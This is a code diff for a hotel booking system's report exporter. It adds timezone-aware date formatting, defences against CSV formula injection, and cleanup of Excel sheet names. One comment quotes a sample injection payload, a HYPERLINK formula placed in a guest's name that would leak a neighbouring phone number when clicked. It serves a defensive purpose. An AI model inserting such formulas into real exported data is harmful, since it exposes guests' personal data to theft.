@@ -4,6 +4,28 @@ const {
   TextRun, HeadingLevel, WidthType, AlignmentType, BorderStyle,
 } = require('docx')
 const { createError } = require('../middleware/errorHandler')
+const { hotelTz } = require('../utils/hotelTz')
+
+/**
+ * Момент времени → «ДД.ММ.ГГГГ ЧЧ:ММ» по времени отеля (D4-012). Сервер живёт в
+ * UTC (`server.js`), поэтому `getHours()` печатал бы Гринвич — на пять часов
+ * раньше того, что видит стойка.
+ */
+function formatDateTimeLocal(value) {
+  const d = value instanceof Date ? value : new Date(value)
+  if (Number.isNaN(d.getTime())) return String(value)
+  let parts
+  try {
+    parts = new Intl.DateTimeFormat('ru-RU', {
+      timeZone: hotelTz(), year: 'numeric', month: '2-digit', day: '2-digit',
+      hour: '2-digit', minute: '2-digit', hourCycle: 'h23',
+    }).formatToParts(d)
+  } catch {
+    return d.toISOString().slice(0, 16).replace('T', ' ')
+  }
+  const get = (t) => (parts.find((p) => p.type === t) || {}).value || ''
+  return `${get('day')}.${get('month')}.${get('year')} ${get('hour')}:${get('minute')}`
+}
 
 /**
  * Выгрузка результата отчёта в файлы.
@@ -38,12 +60,7 @@ function asText(value, type) {
       const m = /^(\d{4})-(\d{2})/.exec(String(value))
       return m ? `${MONTHS_NOM[Number(m[2]) - 1]} ${m[1]}` : String(value)
     }
-    case 'datetime': {
-      const d = new Date(value)
-      if (Number.isNaN(d.getTime())) return String(value)
-      const p = (n) => String(n).padStart(2, '0')
-      return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`
-    }
+    case 'datetime': return formatDateTimeLocal(value)
     case 'bool': return value ? 'да' : 'нет'
     case 'list': return Array.isArray(value) ? value.join(', ') : String(value)
     default: return String(value)
@@ -65,7 +82,7 @@ function periodLabel(result) {
 
 function subtitle(result) {
   const parts = [result.meta.hotelName, periodLabel(result)].filter(Boolean)
-  parts.push(`сформирован ${new Date(result.meta.generatedAt).toLocaleString('ru-RU')}`)
+  parts.push(`сформирован ${formatDateTimeLocal(result.meta.generatedAt)}`)
   if (result.meta.requestedBy) parts.push(result.meta.requestedBy)
   return parts.join(' · ')
 }
@@ -85,6 +102,37 @@ function totalsRow(result, totalsLabel) {
 
 // --- CSV --------------------------------------------------------------------
 
+// Телефон и обычное отрицательное число: `+7 701 123 45 67`, `-5`, `-1 200,50`,
+// `+7 (701) 123-45-67`. Такие ячейки Excel формулой не считает, и портить их
+// апострофом значит ломать выгрузку ради несуществующего риска.
+const PLAIN_NUMBER = /^[+-]?\d[\d\s().,-]*$/
+
+/**
+ * Нейтрализация формул в CSV (D4-002).
+ *
+ * Excel считает формулой всё, что начинается с `=`, `+`, `-`, `@`, а также с
+ * табуляции и возврата каретки — включая содержимое ячейки, которую он сам
+ * распаковал из кавычек. Имя гостя и примечание пишет стойка, то есть текст
+ * произвольный: `=HYPERLINK("http://…"&C2;"Иванов")` в имени утащит телефон из
+ * соседней ячейки по одному клику администратора. Ведущий апостроф — то, что
+ * Excel понимает как «это текст»: в ячейке он не виден, в строке формул виден.
+ *
+ * xlsx и docx этого не требуют: там строка записывается строкой, формулой в
+ * exceljs становится только объект `{ formula }`.
+ */
+function csvSafe(s) {
+  const str = String(s)
+  if (!str) return str
+  // Excel при импорте отбрасывает ведущие пробельные символы, поэтому смотрим на
+  // первый непробельный знак (OWASP; находка тестов волны 9).
+  // \u0422\u0430\u0431\u0443\u043b\u044f\u0446\u0438\u044f \u0438 \u0432\u043e\u0437\u0432\u0440\u0430\u0442 \u043a\u0430\u0440\u0435\u0442\u043a\u0438 \u2014 \u0442\u0440\u0438\u0433\u0433\u0435\u0440\u044b \u0441\u0430\u043c\u0438 \u043f\u043e \u0441\u0435\u0431\u0435 (\u043f\u043e \u0441\u044b\u0440\u043e\u043c\u0443 \u043f\u0435\u0440\u0432\u043e\u043c\u0443 \u0437\u043d\u0430\u043a\u0443).
+  if (str[0] === '\t' || str[0] === '\r') return `'${str}`
+  const ch = str.replace(/^[\s\u00a0]+/, '')[0]
+  if (ch === '=' || ch === '@') return `'${str}`
+  if ((ch === '+' || ch === '-') && !PLAIN_NUMBER.test(str)) return `'${str}`
+  return str
+}
+
 /**
  * Разделитель — точка с запятой, десятичный — запятая: так файл открывается
  * двойным кликом в русском Excel. BOM нужен, иначе кириллица превращается
@@ -98,11 +146,14 @@ function buildCsv(result, totalsLabel) {
   }
   const cell = (value, type) => {
     if (value === null || value === undefined || value === '') return ''
+    // Числовая колонка — своя ветка: там значение уже число, а не текст стойки.
     if (NUMERIC.has(type) && typeof value === 'number') return String(value).replace('.', ',')
-    return asText(value, type)
+    return csvSafe(asText(value, type))
   }
 
-  const lines = [columns.map((c) => esc(c.title)).join(';')]
+  // Апостроф ставим ДО кавычек: `esc` обязан видеть ячейку такой, какой она
+  // уйдёт в файл, иначе кавычки посчитались бы по старой длине.
+  const lines = [columns.map((c) => esc(csvSafe(c.title))).join(';')]
   for (const row of rows) {
     lines.push(columns.map((c) => esc(cell(row[c.key], c.type))).join(';'))
   }
@@ -114,13 +165,38 @@ function buildCsv(result, totalsLabel) {
 
 // --- Excel ------------------------------------------------------------------
 
+/**
+ * Имя листа Excel по названию отчёта (D4-001).
+ *
+ * Excel запрещает в имени листа семь символов, апостроф по краям, длину больше
+ * 31 и зарезервированное «History»; exceljs на любом из этих случаев бросает
+ * обычный `Error`, который движок не переводит в 400, — кнопка «Excel» отвечала
+ * «Внутренняя ошибка сервера» на отчёте с названием «Долги / переплаты». Имя
+ * листа — это оформление, а не данные: название целиком стоит в заголовке
+ * первой строки, поэтому здесь чистим молча, а не отказываем.
+ */
+function safeSheetName(title) {
+  const name = String(title === null || title === undefined ? '' : title)
+    .replace(/[*?:/\\[\]]/g, ' ')
+    .replace(/^'+|'+$/g, '')   // апостроф по краям запрещён отдельным правилом
+    .replace(/\s+/g, ' ')
+    .trim()
+    .slice(0, 31)
+    // Обрезка на 31 символе может заново оставить пробел или апостроф с краю —
+    // повторяем чистку, иначе длинное название всё равно уронит exceljs.
+    .replace(/^'+|'+$/g, '')
+    .trim()
+  if (!name || name.toLowerCase() === 'history') return 'Отчёт'
+  return name
+}
+
 async function buildXlsx(result, totalsLabel) {
   const { columns, rows } = result
   const wb = new ExcelJS.Workbook()
   wb.creator = result.meta.hotelName || 'Hotel Booking'
   wb.created = new Date()
 
-  const ws = wb.addWorksheet(result.report.title.slice(0, 30), {
+  const ws = wb.addWorksheet(safeSheetName(result.report.title), {
     views: [{ state: 'frozen', ySplit: 3 }],
     pageSetup: { orientation: 'landscape', fitToPage: true, fitToWidth: 1, fitToHeight: 0 },
   })
@@ -275,4 +351,4 @@ async function exportReport(result, format, totalsLabel = 'Итого') {
   }
 }
 
-module.exports = { exportReport, FORMATS, buildCsv, buildXlsx, buildDocx, translit }
+module.exports = { exportReport, FORMATS, buildCsv, buildXlsx, buildDocx, translit, formatDateTimeLocal, csvSafe, safeSheetName }
